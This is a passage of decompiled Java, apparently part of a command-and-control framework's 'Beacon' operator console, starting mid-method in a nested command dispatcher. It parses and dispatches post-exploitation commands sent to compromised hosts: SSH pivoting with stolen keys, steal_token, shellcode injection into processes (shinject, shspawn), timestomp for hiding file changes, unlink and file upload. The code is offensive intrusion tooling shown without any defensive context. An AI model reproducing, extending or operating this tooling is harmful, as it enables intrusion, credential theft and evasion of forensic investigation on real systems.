                                                this.master.SpawnTo();
                                             } else if (var3.verify("XZ")) {
                                                var4 = var3.popString();
                                                var10 = var3.popString();
                                                this.master.SpawnTo(var10, var4);
                                             }
                                          } else {
                                             int var21;
                                             if (var3.is("ssh")) {
                                                if (var3.verify("AAZ")) {
                                                   var4 = var3.popString();
                                                   var10 = var3.popString();
                                                   var14 = var3.popString();
                                                   var7 = CommonUtils.Host(var14);
                                                   var21 = CommonUtils.Port(var14, 22);
                                                   this.master.SecureShell(var10, var4, var7, var21);
                                                }
                                             } else if (var3.is("ssh-key")) {
                                                if (var3.verify("AAF")) {
                                                   var4 = var3.popString();
                                                   var10 = var3.popString();
                                                   var14 = var3.popString();
                                                   var7 = CommonUtils.Host(var14);
                                                   var21 = CommonUtils.Port(var14, 22);
                                                   byte[] var23 = CommonUtils.readFile(var4);
                                                   if (var23.length > 6140) {
                                                      var3.error("key file " + var4 + " is too large");
                                                   } else {
                                                      this.master.SecureShellPubKey(var10, var23, var7, var21);
                                                   }
                                                } else if (var3.isMissingArguments() && var3.verify("AA")) {
                                                   var4 = var3.popString();
                                                   var10 = var3.popString();
                                                   var14 = CommonUtils.Host(var10);
                                                   final int var24 = CommonUtils.Port(var10, 22);
                                                   SafeDialogs.openFile("Select PEM file", (String)null, (String)null, false, false, new SafeDialogCallback() {
                                                      public void dialogResult(String var1) {
                                                         byte[] var3 = CommonUtils.readFile(var1);
                                                         BeaconConsole.this.master.SecureShellPubKey(var4, var3, var14, var24);
                                                      }
                                                   });
                                                }
                                             } else if (var3.is("steal_token")) {
                                                if (var3.verify("I")) {
                                                   this.master.StealToken(var3.popInt());
                                                }
                                             } else if (var3.is("shinject")) {
                                                if (!var3.verify("IXF") && !var3.reset()) {
                                                   if (var3.verify("IX")) {
                                                      var4 = var3.popString();
                                                      var12 = var3.popInt();
                                                      SafeDialogs.openFile("Select shellcode to inject", (String)null, (String)null, false, false, new SafeDialogCallback() {
                                                         public void dialogResult(String var1) {
                                                            BeaconConsole.this.master.ShellcodeInject(var12, var4, var1);
                                                         }
                                                      });
                                                   }
                                                } else {
                                                   var4 = var3.popString();
                                                   var10 = var3.popString();
                                                   var15 = var3.popInt();
                                                   this.master.ShellcodeInject(var15, var10, var4);
                                                }
                                             } else if (var3.is("shspawn")) {
                                                if (!var3.verify("XF") && !var3.reset()) {
                                                   if (var3.verify("X")) {
                                                      var4 = var3.popString();
                                                      SafeDialogs.openFile("Select shellcode to inject", (String)null, (String)null, false, false, new SafeDialogCallback() {
                                                         public void dialogResult(String var1) {
                                                            BeaconConsole.this.master.ShellcodeSpawn(var4, var1);
                                                         }
                                                      });
                                                   }
                                                } else {
                                                   var4 = var3.popString();
                                                   var10 = var3.popString();
                                                   this.master.ShellcodeSpawn(var10, var4);
                                                }
                                             } else if (var3.is("timestomp")) {
                                                if (var3.verify("AA")) {
                                                   var4 = var3.popString();
                                                   var10 = var3.popString();
                                                   this.master.TimeStomp(var10, var4);
                                                }
                                             } else if (var3.is("unlink")) {
                                                if (!var3.verify("AI") && !var3.reset()) {
                                                   if (var3.verify("Z")) {
                                                      this.master.Unlink(var3.popString());
                                                   }
                                                } else {
                                                   var4 = var3.popString();
                                                   var10 = var3.popString();
                                                   this.master.Unlink(var10, var4);
                                                }
                                             } else if (var3.is("upload") && var3.empty()) {
                                                SafeDialogs.openFile("Select file to upload", (String)null, (String)null, false, false, new SafeDialogCallback() {
                                                   public void dialogResult(String var1) {
                                                      BeaconConsole.this.master.Upload(var1);
                                                   }
                                                });
                                             } else if (var3.is("upload")) {
                                                if (var3.verify("f")) {
                                                   this.master.Upload(var3.popString());
                                                }
                                             } else {
                                                this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.Error(this.bid, "Unknown command: " + var2)));
                                             }
                                          }
                                       }
                                    }
                                 }
                              }
                           }
                        }
                     }
                  }
               }

               if (var3.hasError()) {
                  this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.Error(this.bid, var3.error())));
               }

            }
         } else {
            this.console.append(this.formatLocal(BeaconOutput.Input(this.bid, var2)) + "\n");
            if (!var3.verify("Z") && !var3.reset()) {
               this.console.append(this.engine.format("BEACON_OUTPUT_HELP", new Stack()) + "\n");
            } else {
               var4 = var3.popString();
               BeaconCommands var5 = DataUtils.getBeaconCommands(this.data);
               if (var5.isHelpAvailable(var4)) {
                  Stack var6 = new Stack();
                  var6.push(SleepUtils.getScalar(var4));
                  this.console.append(this.engine.format("BEACON_OUTPUT_HELP_COMMAND", var6) + "\n");
               } else {
                  var3.error("no help is available for '" + var4 + "'");
               }
            }

            if (var3.hasError()) {
               this.console.append(this.formatLocal(BeaconOutput.Error(this.bid, var3.error())) + "\n");
            }

         }
      }
   }
}
